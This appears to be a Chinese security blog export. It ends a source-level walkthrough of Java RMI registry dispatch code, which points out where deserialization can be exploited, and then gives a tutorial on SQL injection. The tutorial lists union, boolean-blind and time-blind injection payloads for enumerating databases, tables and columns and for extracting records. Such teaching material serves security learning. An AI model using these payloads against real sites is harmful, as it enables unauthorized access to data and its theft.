<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">serviceCall</span><span class="params">(<span class="keyword">final</span> RemoteCall call)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">/* read object id */</span></span><br><span class="line">        <span class="keyword">final</span> Remote impl;</span><br><span class="line">        ObjID id;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            id = ObjID.read(call.getInputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* get the remote object */</span></span><br><span class="line">        <span class="type">Transport</span> <span class="variable">transport</span> <span class="operator">=</span> id.equals(dgcID) ? <span class="literal">null</span> : <span class="built_in">this</span>;</span><br><span class="line">        <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">            ObjectTable.getTarget(<span class="keyword">new</span> <span class="title class_">ObjectEndpoint</span>(id, transport));</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="literal">null</span> || (impl = target.getImpl()) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchObjectException</span>(<span class="string">&quot;no such object in table&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Dispatcher</span> <span class="variable">disp</span> <span class="operator">=</span> target.getDispatcher();</span><br><span class="line">        target.incrementCallCount();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* call the dispatcher */</span></span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                setContextClassLoader(ccl);</span><br><span class="line">                currentTransport.set(<span class="built_in">this</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.security.AccessController.doPrivileged(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                            checkAcceptPermission(acc);</span><br><span class="line">                            disp.dispatch(impl, call);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, acc);</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="comment">//省略部分代码......</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看一下<strong>UnicastServerRef</strong>的<strong>dispatch</strong>方法</p>
<p>这里先判断了<strong>this.skel</strong>是否为空，用来区别自己是<strong>Registry</strong>还是<strong>Server</strong></p>
<p>然后调用<strong>oldDispatch</strong>方法，</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote obj, RemoteCall call)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// positive operation number in 1.1 stubs;</span></span><br><span class="line">    <span class="comment">// negative version number in 1.2 stubs and beyond...</span></span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="type">long</span> op;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// read remote call header</span></span><br><span class="line">        ObjectInput in;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = call.getInputStream();</span><br><span class="line">            num = in.readInt();</span><br><span class="line">            <span class="keyword">if</span> (num &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (skel != <span class="literal">null</span>) &#123;</span><br><span class="line">                    oldDispatch(obj, call, num);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                        <span class="string">&quot;skeleton class not found but required &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;for client version&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            op = in.readLong();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>,</span><br><span class="line">                                         readEx);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进<strong>oldDispatch</strong>方法，在最后调用了<strong>this.skel</strong>也就是<strong>RegistryImpl_Skel</strong>类的<strong>dispatch</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oldDispatch</span><span class="params">(Remote obj, RemoteCall call, <span class="type">int</span> op)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> hash;              <span class="comment">// hash for matching stub with skeleton</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// read remote call header</span></span><br><span class="line">        ObjectInput in;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = call.getInputStream();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.rmi.transport.DGCImpl_Skel&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (clazz.isAssignableFrom(skel.getClass())) &#123;</span><br><span class="line">                    ((MarshalInputStream)in).useCodebaseOnly();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException ignore) &#123; &#125;</span><br><span class="line">            hash = in.readLong();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>,</span><br><span class="line">                                         readEx);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if calls are being logged, write out object id and operation</span></span><br><span class="line">        logCall(obj, skel.getOperations()[op]);</span><br><span class="line">        unmarshalCustomCallData(in);</span><br><span class="line">        <span class="comment">// dispatch to skeleton for remote object</span></span><br><span class="line">        skel.dispatch(obj, call, op, hash);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进<strong>RegistryImpl_Skel</strong>类的<strong>dispatch</strong>方法，这里才是重点</p>
<p>主要作用是根据流中写入的不同的操作类型分发给不同的方法处理</p>
<p>与注册中心进行交互的几种方式在<strong>dispatch</strong>中的对应关系</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(opnum)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:	<span class="comment">// bind(String, Remote)</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// list()</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// lookup(String)</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// rebind(String, Remote)</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// unbind(String)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们当前主要是<strong>2–&gt;lookup</strong></p>
<p>在服务端，我们将<strong>remoteObj</strong>名称序列化传到注册中心</p>
<p>在注册中心，会将其反序列读出来</p>
<p><strong>var10</strong>其实就是我们<strong>lookup</strong>寻找远程对象的方法名</p>
<p>不只是在<strong>lookup</strong>中，只要存在<strong>readObject</strong>都有机会利用</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="服务端响应客户端"><a href="#服务端响应客户端" class="headerlink" title="服务端响应客户端"></a>服务端响应客户端</h2><p>当前的<strong>Target</strong>是动态代理<strong>Proxy</strong>，所以<strong>skel&#x3D;&#x3D;null</strong></p>
<p>就不会调用<strong>oldDispatch</strong>方法了</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote obj, RemoteCall call)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// positive operation number in 1.1 stubs;</span></span><br><span class="line">    <span class="comment">// negative version number in 1.2 stubs and beyond...</span></span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="type">long</span> op;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// read remote call header</span></span><br><span class="line">        ObjectInput in;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = call.getInputStream();</span><br><span class="line">            num = in.readInt();</span><br><span class="line">            <span class="keyword">if</span> (num &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (skel != <span class="literal">null</span>) &#123;</span><br><span class="line">                    oldDispatch(obj, call, num);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                        <span class="string">&quot;skeleton class not found but required &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;for client version&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            op = in.readLong();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续往下走，获取到输入流，以及<strong>Method</strong>，<strong>Method</strong>就是我们之前写的**sayHello()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote obj, RemoteCall call)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    	<span class="comment">//省略部分代码......</span></span><br><span class="line">        <span class="type">MarshalInputStream</span> <span class="variable">marshalStream</span> <span class="operator">=</span> (MarshalInputStream) in;</span><br><span class="line">        marshalStream.skipDefaultResolveClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> hashToMethod_Map.get(op);</span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;unrecognized method hash: &quot;</span> +</span><br><span class="line">                <span class="string">&quot;method not supported by remote object&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if calls are being logged, write out object id and operation</span></span><br><span class="line">        logCall(obj, method);</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续往下走，循环当中的**unmarshalValue()**方法</p>
<p>这个之前有提到，会将客户端传过来的序列化参数反序列化出来，是存在漏洞的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote obj, RemoteCall call)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    	<span class="comment">//省略部分代码......</span></span><br><span class="line">        <span class="comment">// unmarshal parameters</span></span><br><span class="line">        Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">        Object[] params = <span class="keyword">new</span> <span class="title class_">Object</span>[types.length];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            unmarshalCustomCallData(in);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">                params[i] = unmarshalValue(types[i], in);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                <span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                <span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            call.releaseInputStream();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续往下走，最后利用<strong>marshalValue</strong>方法，将结果序列化，写到字节流，返回给客户端</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote obj, RemoteCall call)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    	<span class="comment">//省略部分代码......</span></span><br><span class="line">        <span class="comment">// make upcall on remote object</span></span><br><span class="line">        Object result;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            result = method.invoke(obj, params);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e.getTargetException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// marshal return value</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">            Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">            <span class="keyword">if</span> (rtype != <span class="keyword">void</span>.class) &#123;</span><br><span class="line">                marshalValue(rtype, result, out);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>引用一下<a class="link"   href="https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93" >素十八 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>师傅的总结</p>
<p><strong>RMI</strong>底层通讯采用了 <strong>Stub(运行在客户端)</strong> 和 <strong>Skeleton(运行在服务端)</strong> 机制，**RMI **调用远程方法的大致如下：</p>
<ol>
<li>**RMI <strong>客户端在调用远程方法时会先创建</strong>Stub (sun.rmi.registry.RegistryImpl_Stub)**。</li>
<li>**Stub **会将 Remote 对象传递给远程引用层 **( java.rmi.server.RemoteRef ) **并创建 **java.rmi.server.RemoteCall( 远程调用 )**对象。</li>
<li><strong>RemoteCall <strong>序列化 <strong>RMI</strong> 服务名称、</strong>Remote</strong> 对象。</li>
<li><strong>RM</strong>I 客户端的远程引用层传输 <strong>RemoteCall</strong> 序列化后的请求信息通过 <strong>Socket</strong> 连接的方式传输到 <strong>RMI</strong> 服务端的远程引用层。</li>
<li><strong>RMI</strong> 服务端的远程引用层**( sun.rmi.server.UnicastServerRef )**收到请求会请求传递给 **Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )**。</li>
<li>**Skeleton **调用 <strong>RemoteCall</strong> 反序列化 <strong>RMI</strong> 客户端传过来的序列化。</li>
<li><strong>Skeleton</strong> 处理客户端请求：<strong>bind</strong>、<strong>list</strong>、<strong>lookup</strong>、<strong>rebind</strong>、<strong>unbind</strong>，如果是 <strong>lookup</strong> 则查找 <strong>RMI</strong> 服务名绑定的接口对象，序列化该对象并通过 <strong>RemoteCall</strong> 传输到客户端。</li>
<li><strong>RMI</strong> 客户端反序列化服务端结果，获取远程对象的引用。</li>
<li><strong>RMI</strong> 客户端调用远程方法，<strong>RMI</strong> 服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li>
<li>**RMI **客户端反序列化 <strong>RMI</strong> 远程方法调用结果</li>
</ol>
<h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h1><p><a class="link"   href="https://su18.org/post/rmi-attack/" >https://su18.org/post/rmi-attack/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1L3411a7ax?p=1&vd_source=19d2e433219440bcf5304fbe8a00b7ff" >https://www.bilibili.com/video/BV1L3411a7ax?p=1&amp;vd_source=19d2e433219440bcf5304fbe8a00b7ff <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://wx.zsxq.com/dweb2/index/group/2212251881" >https://wx.zsxq.com/dweb2/index/group/2212251881 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2023/08/26/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="0x00-SQL注入概念"><a href="#0x00-SQL注入概念" class="headerlink" title="0x00 SQL注入概念"></a>0x00 SQL注入概念</h1><p>SQL注入是一种针对Web应用程序的攻击技术，攻击者通过利用应用程序没有正确过滤或转义用户输入的漏洞，在执行SQL查询时注入恶意代码，以达到获取、删除、修改数据等目的。</p>
<h1 id="0x01-SQL注入原理"><a href="#0x01-SQL注入原理" class="headerlink" title="0x01 SQL注入原理"></a>0x01 SQL注入原理</h1><p>由于服务器未严格校验用户传递的数据，使得攻击者通过构造恶意字符或SQL语句，导致服务器端SQL代码产生歧义并执行了未经授权的查询命令。</p>
<h1 id="0x02-SQL注入危害"><a href="#0x02-SQL注入危害" class="headerlink" title="0x02 SQL注入危害"></a>0x02 SQL注入危害</h1><p>数据库信息泄露。</p>
<p>数据库数据完整性破坏。</p>
<p>未经授权访问。</p>
<p>登录认证绕过。</p>
<h1 id="0x03-SQL注入条件"><a href="#0x03-SQL注入条件" class="headerlink" title="0x03 SQL注入条件"></a>0x03 SQL注入条件</h1><p>用户可以控制传参。</p>
<p>用户输入的语句被带入到数据库中执行。</p>
<h1 id="0x04-SQL注入利用"><a href="#0x04-SQL注入利用" class="headerlink" title="0x04 SQL注入利用"></a>0x04 SQL注入利用</h1><h3 id="显注—union"><a href="#显注—union" class="headerlink" title="显注—union"></a>显注—union</h3><p>判断是否存在注入点</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字</span><br><span class="line">?id=1 and 1=1 正常</span><br><span class="line">?id=1 and 1=2 报错</span><br><span class="line">字符</span><br><span class="line">?id=1&#x27; and 1=1# 正常</span><br><span class="line">?id=1&#x27; and 1=2# 报错</span><br></pre></td></tr></table></figure></div>

<p>判断字段数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 2# 正常</span><br><span class="line">?id=1&#x27; order by 3# 报错</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,2# 正常</span><br><span class="line">?id=1&#x27; union select 1,2,3# 报错</span><br><span class="line">可判断字段数为3</span><br></pre></td></tr></table></figure></div>

<p>获取数据库信息</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=2 union select 1,database() #查当前的库名</span><br><span class="line">?id=1&#x27; and 1=2 union select 1,schema_name from information_schema.schemata # 查全部库名</span><br></pre></td></tr></table></figure></div>

<p>查询数据库表名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and 1=2 union select 1,table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27;#</span><br></pre></td></tr></table></figure></div>

<p>查询数据库字段</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and 1=2 union select 1,column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;#</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>获取信息</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=2 union select 1,字段名 from 表名#</span><br></pre></td></tr></table></figure></div>

<h3 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h3><p>只能通过页面返回的真假条件判断是否存在注入</p>
<p>判断是否存在注入点</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1#		页面返回正常</span><br><span class="line">?id=1&#x27; and 1=2#		页面返回不正常</span><br></pre></td></tr></table></figure></div>

<p>判断数据库名长度—length()</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;=1#		页面返回正常</span><br><span class="line">?id=1&#x27;and length(database())&gt;=13#		页面返回正常</span><br><span class="line">?id=1&#x27;and length(database())&gt;=14#		页面返回错误</span><br></pre></td></tr></table></figure></div>

<p>猜解数据库名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-当前数据库</span><br><span class="line">?id=1&#x27; and substr(database(),1,1)=&#x27;a&#x27;#</span><br><span class="line">?id=1&#x27; and substr(database(),2,1)=&#x27;a&#x27;#</span><br><span class="line">?id=1&#x27; and ascii(substr(database(),2,1))=97#</span><br><span class="line">-所有数据库</span><br><span class="line">--数据库总数</span><br><span class="line">?id=1&#x27; and (select count(schema_name) from information_schema.schemata)=6#</span><br><span class="line">--第一个数据库库名长度</span><br><span class="line">?id=1&#x27; and length((select schema_name from information_schema.schemata limit 0,1))=18 #</span><br><span class="line">--爆库名</span><br><span class="line">?id=1&#x27; and substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&#x27;a&#x27; </span><br><span class="line">?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=97#</span><br></pre></td></tr></table></figure></div>

<p>查询数据库表名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-判断有几个表名</span><br><span class="line">?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;)=2 #</span><br><span class="line">-判断第一个表名长度</span><br><span class="line">1&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1))&lt;15#</span><br><span class="line">-爆表名</span><br><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27; # </span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=97 #</span><br></pre></td></tr></table></figure></div>

<p>查询数据库列名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-判断查询的表有多少列</span><br><span class="line">?id=1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;)=8 #</span><br><span class="line">-判断每一列的列名长</span><br><span class="line">?id=1&#x27; and length((select column_name from information_schema.columns where table_schema= &#x27;数据库名&#x27; and table_name= &#x27;表名&#x27; limit 0,1))=7#</span><br><span class="line">-判断第一列列名</span><br><span class="line">?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema= &#x27;数据库名&#x27; and table_name= &#x27;表名&#x27; limit 0,1),1,1))=&#x27;p&#x27;#</span><br><span class="line">?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema= &#x27;数据库名&#x27; and table_name= &#x27;表名&#x27; limit 0,1),1,1)))=97#</span><br></pre></td></tr></table></figure></div>

<p>获取信息</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-判断列中有几条记录</span><br><span class="line">?id=1&#x27; and (select count(*) from 数据库名.表名)=5# </span><br><span class="line">-判断这一列的第一条记录的长度是否为5</span><br><span class="line">?id=1&#x27; and length(substr((select 列名 from 表名 limit 0,1),1))=5# </span><br><span class="line">-判断这一列的第一条记录的第一个字段是否为a</span><br><span class="line">?id=1&#x27; and substr((select user from users limit 0,1),1,1)=&#x27;a&#x27;# </span><br><span class="line">?id=1&#x27; and ascii(substr((select user from users limit 0,1),1,1))=97#</span><br></pre></td></tr></table></figure></div>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>原理：没有具体回显，只能通过后台执行时间判断</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：</span><br><span class="line">sleep()、benchmark() ---延时函数</span><br><span class="line">if(a,b,c) ---如果a正确，执行b，否则执行c</span><br><span class="line"></span><br><span class="line">主要通过 if()+延时函数+Boolean盲注</span><br><span class="line">?id=1&#x27; and if(length(database()&gt;2),sleep(2),1)# ---如果数据库名长度大于2，即会延迟两秒执行。</span><br></pre></td></tr></table></figure></div>

<p>判断注入点</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 and sleep(2)# 页面正常，延时2秒</span><br><span class="line">?id=1&#x27; and 1=2 and sleep(2)# 页面不正常，没有延时</span><br></pre></td></tr></table></figure></div>

